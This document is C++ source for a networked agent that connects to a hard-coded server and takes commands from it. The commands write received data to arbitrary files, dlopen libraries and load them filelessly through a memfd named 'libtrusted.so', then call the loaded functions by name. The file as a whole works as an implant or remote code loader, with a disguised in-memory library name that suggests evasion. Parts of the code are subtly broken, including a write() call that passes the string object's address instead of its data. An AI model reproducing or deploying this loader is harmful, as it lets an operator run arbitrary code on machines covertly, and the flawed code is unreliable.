#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <strings.h>
#include <thread>
#include <queue>
#include <mutex>
#include <functional>
#include <unordered_map>
#include <dlfcn.h>
#include <sys/mman.h>


#include <fstream>

using namespace std;

int socket_fd;
mutex history_mutex;
bool active;
unordered_map<string,void(*)()> functionMapping;
unordered_map<string,string> textStorage;
unordered_map<string,void*> sharedObjectHandlers;
vector<string> stringArgs;
vector<int> intArgs;


//Support functions Starts
int stringToInt(string str){
    int num=0,multiplier=1,i=0;
    if(str[0]=='-'){
        multiplier=-1;
        i=1;
    }
    for(;i<str.size();i++){
        if(str[i]<48 || str[i]>57) return -1;
        num = (num*10)+(str[i]%48);
    }
    return num*multiplier;
}

string nextToken(string str, int &cursor){
    string token="";
    bool check=false;
    for(int i=0;i<str.size();i++){
        cursor++;
        if(str[i]>=33 && str[i]<=128) check=true;
        else{
            if(check) return token;
        }
        if(check) token+=str[i];
    }
    return token;
}
string nextToken(string str){
    int cursor=0;
    return nextToken(str,cursor);
}

int nextInt(string str,int &cursor){
    string token="";
    bool check=false;
    for(int i=0;i<str.size();i++){
        cursor++;
        if(str[i]>=48 && str[i]<=57) check=true;
        else{
            if(check) return stringToInt(token);
        }
        if(check) token+=str[i];
    }
    return stringToInt(token);
}
int nextInt(string str){
    int cursor=0;
    return nextInt(str,cursor);
}
void clearArgs(){
    intArgs = vector<int>();
    stringArgs = vector<string>();
}
string decapitalise(string str){
    string lowered="";
    for(int i=0;i<str.size();i++){ 
        if(str[i]>=65 && str[i]<=90) lowered+=(str[i]+32);
        else lowered+=str[i];
    }
    return lowered;
}
//Support functions ends


//Socket functions start
void getMessage(int fd, queue<string> &history, int BUFFER_SIZE){
    char buffer[BUFFER_SIZE+1];
    while(active){
        int bytes_read = read(fd,&buffer,sizeof(buffer));
        if(bytes_read>0){
            buffer[bytes_read] = '\0';
            {
                lock_guard<mutex> lock(history_mutex);
                history.push(string(buffer,bytes_read));
            }
        }
        usleep(10*1000);
    }
}

void initializeSocket(int &socketfd,char IP[], int &PORT,sockaddr_in &address){
    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    inet_pton(AF_INET, IP, &address.sin_addr);
    if((socketfd = socket(AF_INET, SOCK_STREAM, 0))<0){
        perror("[X] Failed to initialize socket...\n");
        return ;
    }
}

void makeConnection(int &socketfd,sockaddr_in &address){
    while(connect(socketfd, (sockaddr*)&address, sizeof(address))<0){
        perror("[X] Failed to establish connection...\n");
        sleep(1);
    }
}

//Socket Function ends


//Control Function Starts
void quit(){active=false;}


void loadSharedObject(){
    string name = stringArgs[0];
    string path = stringArgs[1];
    sharedObjectHandlers[name] = dlopen(&path[0],RTLD_LAZY);
}

void loadFunction(){
    string functionName = stringArgs[0];
    string libraryName = stringArgs[1];
    void* handler = sharedObjectHandlers[libraryName]; 
    functionMapping[functionName] = (void(*)())dlsym(handler,(const char*) & functionName[0]);
}

void addText(){
    string name=stringArgs[0];
    string data=stringArgs[1];
    if(textStorage.count(name)){
        textStorage[name]+=data;
    }
    else textStorage[name]=data;
}


void deletetextStorage(){
    string name = stringArgs[0];
    textStorage.erase(name);
}
void loadSharedObjectFromText(){
    string name = stringArgs[0];
    string sharedObjectName = stringArgs[1];
    int fd = memfd_create("libtrusted.so", MFD_CLOEXEC);
    write(fd,&textStorage[name],textStorage[name].size());
    char path[64];
    sprintf(path, "/proc/self/fd/%d", fd);
    sharedObjectHandlers[sharedObjectName]= dlopen(path, RTLD_LAZY);
    close(fd);
}

void createFile(){
    string dataName = stringArgs[0];
    string filename = stringArgs[1];
    ofstream myfile(filename);
    myfile<<textStorage[dataName];
    myfile.close();
}

//Control Function ends

void process(string data){
    
    int cursor=0;
    string command= decapitalise(nextToken(data,cursor));
    int args = nextInt(data.substr(cursor,data.size()-cursor),cursor);
    for(int i=0;i<args;i++){
        string datatype = decapitalise(nextToken(data.substr(cursor,data.size()-cursor),cursor));
        if(datatype=="data"){
            int len = nextInt(data.substr(cursor,data.size()-cursor),cursor);
            stringArgs.push_back(data.substr(cursor, len));
            cursor+=len;
        }
        else if(datatype =="int") intArgs.push_back(nextInt(data.substr(cursor,data.size()-cursor),cursor));
        else if(datatype == "string") stringArgs.push_back(nextToken(data.substr(cursor,data.size()-cursor),cursor));
    }
    if(functionMapping.count(command)){
        functionMapping[command]();
    }
    else{
        send(socket_fd,"Invalid Command\n", 16,0);
    }
}

int main(){
    vector<void*> handles;
    char IP[] = "127.0.0.1";
    int PORT = 8080;
    int BUFFER_SIZE = 4*1024*1024;
    sockaddr_in address;
    queue<string> history;
    functionMapping.insert(
        {
            {"exit",quit},
            {"addtext",addText},
            {"clear",clearArgs},
            {"createfile",createFile},
            {"loadfunction",loadFunction},
            {"loadsharedobject",loadSharedObject},
            {"deletetext",deletetextStorage},
            {"loadsharedobjectfromtext",loadSharedObjectFromText}
        }
    );
    active = true;
    initializeSocket(socket_fd,IP,PORT,address);
    makeConnection(socket_fd,address);

    int flags = fcntl(socket_fd, F_GETFL, 0);
    fcntl(socket_fd,F_SETFL, flags | O_NONBLOCK);

    thread reading(getMessage, socket_fd, ref(history),BUFFER_SIZE);

    while(active){
            if(!history.empty()){
                process(history.front());
                {
                    lock_guard<mutex> lock(history_mutex);
                    history.pop();
                }
            }
        usleep(10*1000);
    }
    reading.join();
    for(auto& i :handles) dlclose(i);
    close(socket_fd);
    return 0;
}